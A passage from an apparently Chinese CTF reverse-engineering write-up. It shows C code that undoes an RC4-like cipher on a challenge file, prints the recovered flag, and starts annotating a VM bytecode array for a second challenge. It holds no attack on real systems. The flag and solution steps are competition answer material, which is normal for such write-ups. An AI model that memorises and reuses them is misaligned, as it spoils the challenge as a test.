<span class="number">0x3D</span>, <span class="number">0x7E</span>, <span class="number">0x92</span>, <span class="number">0xE4</span>, <span class="number">0x82</span>, <span class="number">0x06</span>, <span class="number">0xBB</span>, <span class="number">0x7B</span>, <span class="number">0x6A</span>, <span class="number">0x47</span>, <span class="number">0xD9</span>, <span class="number">0xF6</span>, <span class="number">0x1E</span>, <span class="number">0x09</span>, <span class="number">0x58</span>, <span class="number">0x1A</span>, <span class="number">0xD8</span>, <span class="number">0xFE</span>, <span class="number">0x29</span>, <span class="number">0x8C</span>, <span class="number">0xBF</span>, <span class="number">0x54</span>, <span class="number">0xAF</span>, <span class="number">0xAE</span>, <span class="number">0xA2</span>, <span class="number">0x8F</span>, <span class="number">0xD6</span>, <span class="number">0xE7</span>, <span class="number">0xBB</span>, <span class="number">0x24</span>, <span class="number">0x97</span>, <span class="number">0x7A</span>, <span class="number">0xD7</span>, <span class="number">0x7F</span>, <span class="number">0xCB</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0xDC</span>, <span class="number">0xE0</span>, <span class="number">0x5E</span>, <span class="number">0xC9</span>, <span class="number">0xE0</span>, <span class="number">0x95</span>, <span class="number">0x4E</span>, <span class="number">0xC4</span>, <span class="number">0x90</span>, <span class="number">0xEB</span>, <span class="number">0x74</span>, <span class="number">0x6B</span>, <span class="number">0xA0</span>, <span class="number">0x9D</span>, <span class="number">0xCD</span>, <span class="number">0xDE</span>, <span class="number">0xA2</span>, <span class="number">0x87</span>, <span class="number">0x1A</span>, <span class="number">0xD1</span>, <span class="number">0x12</span>, <span class="number">0xC8</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0x4A</span>, <span class="number">0x10</span>, <span class="number">0x60</span>, <span class="number">0x79</span>, <span class="number">0x37</span>, <span class="number">0x29</span>, <span class="number">0x25</span>, <span class="number">0xBA</span>, <span class="number">0xAE</span>, <span class="number">0x04</span>, <span class="number">0x1B</span>, <span class="number">0xDB</span>, <span class="number">0xD5</span>, <span class="number">0x48</span>, <span class="number">0xFE</span>, <span class="number">0x51</span>, <span class="number">0x05</span>, <span class="number">0x83</span>, <span class="number">0x15</span>, <span class="number">0x64</span>, <span class="number">0xC4</span>, <span class="number">0x76</span>, <span class="number">0x34</span>, <span class="number">0xB5</span>, <span class="number">0xF2</span>, <span class="number">0xC5</span>, <span class="number">0x78</span>, <span class="number">0x6F</span>, <span class="number">0xC6</span>, <span class="number">0x10</span>, <span class="number">0x5F</span>, <span class="number">0x53</span>, <span class="number">0x81</span>, <span class="number">0xFB</span>, <span class="number">0x8D</span>, <span class="number">0x40</span>, <span class="number">0xE6</span>, <span class="number">0x71</span>, <span class="number">0xA8</span>, <span class="number">0x57</span>, <span class="number">0xB7</span>, <span class="number">0x99</span>, <span class="number">0x20</span>, <span class="number">0x98</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xD8</span>, <span class="number">0x70</span>, <span class="number">0xB9</span>, <span class="number">0xF8</span>, <span class="number">0xE4</span>, <span class="number">0xB5</span>, <span class="number">0x7A</span>, <span class="number">0xAA</span>, <span class="number">0xFA</span>, <span class="number">0x3C</span>, <span class="number">0x73</span>, <span class="number">0x77</span>, <span class="number">0xE8</span>, <span class="number">0xF9</span>, <span class="number">0x12</span>, <span class="number">0x83</span>, <span class="number">0x2A</span>, <span class="number">0xB1</span>, <span class="number">0xC1</span>, <span class="number">0x9F</span>, <span class="number">0xF5</span>, <span class="number">0x5E</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xD7</span>, <span class="number">0x89</span>, <span class="number">0x30</span>, <span class="number">0x63</span>, <span class="number">0xF4</span>, <span class="number">0x68</span>, <span class="number">0xA9</span>, <span class="number">0x0B</span>, <span class="number">0x36</span>, <span class="number">0x85</span>, <span class="number">0xF8</span>, <span class="number">0xB3</span>, <span class="number">0x95</span>, <span class="number">0x64</span>, <span class="number">0x79</span>, <span class="number">0x56</span>, <span class="number">0x97</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0xA8</span>, <span class="number">0x6C</span>, <span class="number">0x4C</span>, <span class="number">0x52</span>, <span class="number">0x69</span>, <span class="number">0xB6</span>, <span class="number">0x5A</span>, <span class="number">0x54</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x16</span>, <span class="number">0x86</span>, <span class="number">0x46</span>, <span class="number">0xBE</span>, <span class="number">0x31</span>, <span class="number">0x1D</span>, <span class="number">0xCF</span>, <span class="number">0x42</span>, <span class="number">0x31</span>, <span class="number">0x59</span>, <span class="number">0xEE</span>, <span class="number">0xEA</span>, <span class="number">0x0F</span>, <span class="number">0x28</span>, <span class="number">0x57</span>, <span class="number">0x3B</span>, <span class="number">0x7F</span>, <span class="number">0xD0</span>, <span class="number">0xB9</span>, <span class="number">0x8D</span>, <span class="number">0xED</span>, <span class="number">0x44</span>, <span class="number">0x30</span>, <span class="number">0xA7</span>, <span class="number">0xC1</span>, <span class="number">0x5B</span>, <span class="number">0x04</span>, <span class="number">0x33</span>, <span class="number">0xAC</span>, <span class="number">0x02</span>, <span class="number">0x73</span>, <span class="number">0xDB</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x3D</span>, <span class="number">0xB1</span>, <span class="number">0x36</span>, <span class="number">0x9C</span>, <span class="number">0xA0</span>, <span class="number">0x4D</span>, <span class="number">0x9C</span>, <span class="number">0x3E</span>, <span class="number">0x72</span>, <span class="number">0xF1</span>, <span class="number">0x1F</span>, <span class="number">0x88</span>, <span class="number">0xE5</span>, <span class="number">0xAD</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x0E</span>, <span class="number">0x3A</span>, <span class="number">0xE6</span>, <span class="number">0xD2</span>, <span class="number">0xE1</span>, <span class="number">0xE9</span>, <span class="number">0x44</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x99</span>, <span class="number">0xEC</span>, <span class="number">0xBC</span>, <span class="number">0x47</span>, <span class="number">0xCC</span>, <span class="number">0xA6</span>, <span class="number">0x9E</span>, <span class="number">0xD2</span>, <span class="number">0x7C</span>, <span class="number">0xFB</span>, <span class="number">0x72</span>, <span class="number">0xDA</span>, <span class="number">0xA7</span>, <span class="number">0x9A</span>, <span class="number">0x86</span>, <span class="number">0x55</span>, <span class="number">0x8A</span>, <span class="number">0x76</span>, <span class="number">0x9B</span>, <span class="number">0xF3</span>, <span class="number">0x7C</span>, <span class="number">0x8F</span>, <span class="number">0x14</span>, <span class="number">0x7D</span>, <span class="number">0xC5</span>, <span class="number">0x94</span>, <span class="number">0x17</span>, <span class="number">0x8B</span>, <span class="number">0xAB</span>, <span class="number">0x15</span>, <span class="number">0xBF</span>, <span class="number">0x2E</span>, <span class="number">0xDD</span>, <span class="number">0x2C</span>, <span class="number">0xB0</span>, <span class="number">0x62</span>, <span class="number">0x89</span>, <span class="number">0x71</span>, <span class="number">0x92</span>, <span class="number">0x21</span>, <span class="number">0x9D</span>, <span class="number">0x0C</span>, <span class="number">0xEF</span>, <span class="number">0x9E</span>, <span class="number">0xD1</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0xF7</span>, <span class="number">0x4F</span>, <span class="number">0xC3</span>, <span class="number">0xCF</span>, <span class="number">0xFF</span>, <span class="number">0x6E</span>, <span class="number">0xE5</span>, <span class="number">0xEB</span>, <span class="number">0x96</span>, <span class="number">0xF9</span>, <span class="number">0xDF</span>, <span class="number">0xCA</span>, <span class="number">0x07</span>, <span class="number">0xD4</span>, <span class="number">0xA3</span>, <span class="number">0x84</span>, <span class="number">0xE3</span>, <span class="number">0x1F</span>, <span class="number">0x66</span>, <span class="number">0x1D</span>, <span class="number">0x18</span>, <span class="number">0x35</span>, <span class="number">0x41</span>, <span class="number">0x2F</span>, <span class="number">0x02</span>, <span class="number">0x66</span>, <span class="number">0x2E</span>, <span class="number">0x6F</span>, <span class="number">0x61</span>, <span class="number">0xD5</span>, <span class="number">0x3F</span>, <span class="number">0x7D</span>, <span class="number">0x78</span>, <span class="number">0x1C</span>, <span class="number">0x32</span>, <span class="number">0xAB</span>, <span class="number">0xA4</span>, <span class="number">0x67</span>, <span class="number">0xC2</span>, <span class="number">0xC0</span>, <span class="number">0x1C</span>, <span class="number">0x11</span>, <span class="number">0xE2</span>, <span class="number">0x2C</span>, <span class="number">0x38</span>, <span class="number">0x8E</span>, <span class="number">0xB2</span>, <span class="number">0x48</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x22</span>, <span class="number">0xD3</span>, <span class="number">0x41</span>, <span class="number">0xD6</span>, <span class="number">0x91</span>, <span class="number">0x0D</span>, <span class="number">0x03</span>, <span class="number">0xFC</span>, <span class="number">0xFC</span>, <span class="number">0x38</span>, <span class="number">0xAC</span>, <span class="number">0xA9</span>, <span class="number">0x98</span>, <span class="number">0xAA</span>, <span class="number">0x14</span>, <span class="number">0xCB</span>, <span class="number">0xCC</span>, <span class="number">0x4B</span>, <span class="number">0x81</span>, <span class="number">0x2D</span>, <span class="number">0x5C</span>, <span class="number">0xB8</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0xAF</span>, <span class="number">0x93</span>, <span class="number">0xB6</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0xE7</span>, <span class="number">0x35</span>, <span class="number">0x4A</span>, <span class="number">0xC2</span>, <span class="number">0xA5</span>, <span class="number">0x37</span>, <span class="number">0x43</span>, <span class="number">0x9B</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0xC3</span>, <span class="number">0xDD</span>, <span class="number">0xED</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x6A</span>, <span class="number">0x27</span>, <span class="number">0x2F</span>, <span class="number">0x74</span>, <span class="number">0xEE</span>, <span class="number">0xF7</span>, <span class="number">0x26</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0xB8</span>, <span class="number">0xE8</span>, <span class="number">0x61</span>, <span class="number">0xA4</span>, <span class="number">0xB0</span>, <span class="number">0xC0</span>, <span class="number">0x13</span>, <span class="number">0x4E</span>, <span class="number">0xA1</span>, <span class="number">0x17</span> &#125;; </span><br><span class="line"><span class="type">int</span> v8 = <span class="number">0</span>, v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v9, i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> v12, v13;</span><br><span class="line"></span><br><span class="line">inputFile = fopen(<span class="string">&quot;Doraemon1&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">outputFile = fopen(<span class="string">&quot;Doraemon3&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (inputFile == <span class="literal">NULL</span> || outputFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;无法打开文件\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!feof(inputFile)) &#123;</span><br><span class="line">v10 = (v10 + <span class="number">1</span>) % <span class="number">512</span>;</span><br><span class="line">v11 = (sbox[v10] + v11) % <span class="number">512</span>;</span><br><span class="line">v13 = sbox[v10];</span><br><span class="line">sbox[v10] = sbox[v11];</span><br><span class="line">sbox[v11] = v13;</span><br><span class="line">v12 = sbox[(<span class="type">unsigned</span> <span class="type">char</span>)((sbox[v11] + sbox[v10]) % <span class="number">512</span>)];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> c = fgetc(inputFile) ^ v12;</span><br><span class="line">fputc(c, outputFile);</span><br><span class="line"></span><br><span class="line">srand(sbox[v8 % <span class="number">512</span>]);</span><br><span class="line">v9 = rand() % <span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; v9; ++i) &#123;</span><br><span class="line">fgetc(inputFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">++v8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(inputFile);</span><br><span class="line">fclose(outputFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就还原了3，打开3看一下，好像是通过3生成了一个here，那就执行一下，打开here一看，flag出来了</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;i_L0ve_Dor4emon_Fov3rver&#125;</span></span><br></pre></td></tr></table></figure><h4 id="舔狗四部曲–简爱"><a href="#舔狗四部曲–简爱" class="headerlink" title="舔狗四部曲–简爱"></a>舔狗四部曲–简爱</h4><p>先看主函数，好像是两个tea接着一个vm，从后往前试一下，先解vm</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">processCode</span><span class="params">(<span class="type">int</span>* input)</span> &#123;</span><br><span class="line"><span class="type">int</span> code[<span class="number">1802</span>]; <span class="comment">// [rsp+10h] [rbp-1C30h] BYREF</span></span><br><span class="line"><span class="type">int</span> j; <span class="comment">// [rsp+1C38h] [rbp-8h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+1C3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(code, <span class="number">0</span>, <span class="number">0x1C20</span>uLL);</span><br><span class="line">code[<span class="number">32</span>] = <span class="number">2</span>;<span class="comment">//前32使input[0]+32,这一个i，j+1</span></span><br><span class="line">code[<span class="number">65</span>] = <span class="number">2</span>;<span class="comment">//前32使input[1]+32,这一个i，j+1</span></span><br><span class="line">code[<span class="number">66</span>] = <span class="number">4</span>;<span class="comment">//与后一位相加再减70</span></span><br><span class="line">code[<span class="number">98</span>] = <span class="number">2</span>;<span class="comment">//前31个使input[2]+31,这一个i，j+1</span></span><br><span class="line">code[<span class="number">99</span>] = <span class="number">5</span>;<span class="comment">//与后一位相减再加70</span></span><br><span class="line">code[<span class="number">185</span>] = <span class="number">2</span>;<span class="comment">//85个使input[3]+85</span></span><br><span class="line">code[<span class="number">186</span>] = <span class="number">2</span>;<span class="comment">//跳到第5位</span></span><br><span class="line">code[<span class="number">187</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">188</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">189</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">190</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">191</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">192</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">193</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">194</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">195</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">196</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">197</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">198</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">199</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">200</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">201</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">202</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">203</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">204</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">205</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">206</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">207</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">208</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">209</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">210</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">211</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">212</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">213</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">214</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">215</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">216</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">217</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">218</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">219</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">220</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">221</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">222</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">223</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">224</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">225</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">226</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">227</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">228</span>] = <span class="number">1</span>;<span class="comment">//input[5]减42</span></span><br><span class="line">code[<span class="number">229</span>] = <span class="number">2</span>;<span class="comment">//input[6]</span></span><br><span class="line">code[<span class="number">232</span>] = <span class="number">2</span>;<span class="comment">//input[6]+=2,i,j+1</span></span><br><span class="line">code[<span class="number">256</span>] = <span class="number">2</span>;<span class="comment">//input[7]+=23,i,j+1</span></span><br><span class="line">code[<span class="number">257</span>] = <span class="number">5</span>;<span class="comment">//input[8]-后一位+70</span></span><br><span class="line">code[<span class="number">303</span>] = <span class="number">1</span>;<span class="comment">//input[8]+45</span></span><br><span class="line">code[<span class="number">304</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">305</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">306</span>] = <span class="number">1</span>;<span class="comment">//input[8]-4</span></span><br><span class="line">code[<span class="number">307</span>] = <span class="number">2</span>;<span class="comment">//i,j+1</span></span><br><span class="line">code[<span class="number">308</span>] = <span class="number">5</span>;<span class="comment">//input[9]-后一位+70</span></span><br><span class="line">code[<span class="number">328</span>] = <span class="number">1</span>;<span class="comment">//input[9]+19</span></span><br><span class="line">code[<span class="number">329</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">330</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">331</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">332</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">333</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">334</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">335</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">336</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">337</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">338</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">339</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">340</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">341</span>] = <span class="number">1</span>;<span class="comment">//input[9]-14</span></span><br><span class="line">code[<span class="number">342</span>] = <span class="number">2</span>;<span class="comment">//input[10]</span></span><br><span class="line">code[<span class="number">353</span>] = <span class="number">2</span>;<span class="comment">//input[10]+10,input[11]</span></span><br><span class="line">code[<span class="number">354</span>] = <span class="number">5</span>;<span class="comment">//input[11]-后一位+70</span></span><br><span class="line">code[<span class="number">430</span>] = <span class="number">2</span>;<span class="comment">//input[11]+75,input[12]</span></span><br><span class="line">code[<span class="number">431</span>] = <span class="number">2</span>;<span class="comment">//input[13]</span></span><br><span class="line">code[<span class="number">432</span>] = <span class="number">5</span>;<span class="comment">//input[13]-后一位+70</span></span><br><span class="line">code[<span class="number">523</span>] = <span class="number">2</span>;<span class="comment">//input[13]+90,input[14]</span></span><br><span class="line">code[<span class="number">524</span>] = <span class="number">5</span>;<span class="comment">//input[14]-后一位+70</span></span><br><span class="line">code[<span class="number">564</span>] = <span class="number">2</span>;<span class="comment">//input[14]+=39,input[15]</span></span><br><span class="line">code[<span class="number">565</span>] = <span class="number">5</span>;<span class="comment">//input[15]-后一位+70</span></span><br><span class="line">code[<span class="number">627</span>] = <span class="number">2</span>;<span class="comment">//input[15]+=61,input[16]</span></span><br><span class="line">code[<span class="number">628</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">629</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">630</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">631</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">632</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">633</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">634</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">635</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">636</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">637</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">638</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">639</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">640</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">641</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">642</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">643</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">644</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">645</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">646</span>] = <span class="number">1</span>;<span class="comment">//input[16]-=19</span></span><br><span class="line">code[<span class="number">647</span>] = <span class="number">2</span>;<span class="comment">//input[17]</span></span><br><span class="line">code[<span class="number">648</span>] = <span class="number">4</span>;<span class="comment">//input[17]+后一位-70</span></span><br><span class="line">code[<span class="number">649</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">650</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">651</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">652</span>] = <span class="number">1</span>;<span class="comment">//input[17]-4</span></span><br><span class="line">code[<span class="number">653</span>] = <span class="number">2</span>;<span class="comment">//input[18]</span></span><br><span class="line">code[<span class="number">680</span>] = <span class="number">2</span>;<span class="comment">//input[18]+26,input[19]</span></span><br><span class="line">code[<span class="number">687</span>] = <span class="number">2</span>;<span class="comment">//input[19]+6,input[20]</span></span><br><span class="line">code[<span class="number">688</span>] = <span class="number">4</span>;<span class="comment">//input[20]+后一位-70</span></span><br><span class="line">code[<span class="number">698</span>] = <span class="number">2</span>;<span class="comment">//input[20]+9,input[21]</span></span><br><span class="line">code[<span class="number">766</span>] = <span class="number">2</span>;<span class="comment">//input[21]+67,input[22]</span></span><br><span class="line">code[<span class="number">767</span>] = <span class="number">5</span>;<span class="comment">//input[22]-后一位+70</span></span><br><span class="line">code[<span class="number">818</span>] = <span class="number">2</span>;<span class="comment">//input[22]+50,input[23]</span></span><br><span class="line">code[<span class="number">819</span>] = <span class="number">1</span>;<span class="comment">//input[23]-1</span></span><br><span class="line">code[<span class="number">820</span>] = <span class="number">2</span>;<span class="comment">//input[24]</span></span><br><span class="line">code[<span class="number">827</span>] = <span class="number">2</span>;<span class="comment">//input[24]+6,input[25]</span></span><br><span class="line">code[<span class="number">828</span>] = <span class="number">5</span>;<span class="comment">//input[25]-后一位+70</span></span><br><span class="line">code[<span class="number">846</span>] = <span class="number">2</span>;<span class="comment">//input[25]+17,input[26]</span></span><br><span class="line">code[<span class="number">847</span>] = <span class="number">5</span>;<span class="comment">//input[26]-后一位+70</span></span><br><span class="line">code[<span class="number">890</span>] = <span class="number">2</span>;<span class="comment">//input[26]+42,input[27]</span></span><br><span class="line">code[<span class="number">891</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">892</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">893</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">894</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">895</span>] = 